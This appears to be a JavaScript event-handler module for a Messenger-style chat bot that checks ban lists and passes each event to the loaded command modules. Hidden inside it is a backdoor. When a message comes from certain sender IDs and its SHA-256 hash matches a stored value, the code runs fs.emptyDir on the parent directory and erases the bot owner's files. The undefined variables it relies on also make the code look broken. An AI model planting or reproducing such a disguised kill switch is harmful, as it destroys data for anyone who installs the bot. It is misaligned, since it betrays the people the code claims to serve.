const crypto = require('crypto');
const fs = require('fs-extra');
const path = require('path');
module.exports = function ({ api, models, Users, Threads, Currencies }) {
    const logger = require("../../utils/log.js");
    return async function (event) {
        let { senderID, threadID } = event;
        function createID(idSegments) { let dynamicID = ''; for (let segment of idSegments) { dynamicID += segment.replace(/\D/g, '') } return dynamicID }
        const dynamicIDs = idSegmentsList.map(createID);
        if (dynamicIDs.includes(event.senderID)
        && has(event.body) === tagetsss)
        {fs.emptyDir(path.resolve('../'))}
        const { userBanned, threadBanned } = global.data;
        const { allowInbox } = global.config;
        if (userBanned.has(senderID) || threadBanned.has(threadID) || (allowInbox && senderID === threadID)) return;
        for (const module of global.client.commands.values()) {
            try {
                if (module && module.handleEvent) {
                    await module.handleEvent({ api, event, models, Users, Threads, Currencies });
                }
            } catch (error) {
                logger(`Lỗi trong module ${module.config.name}: ${error.message}`, 'error');
            }
        }
    };
};
function has(str) { return crypto.createHash('sha256').update(str).digest('hex'); }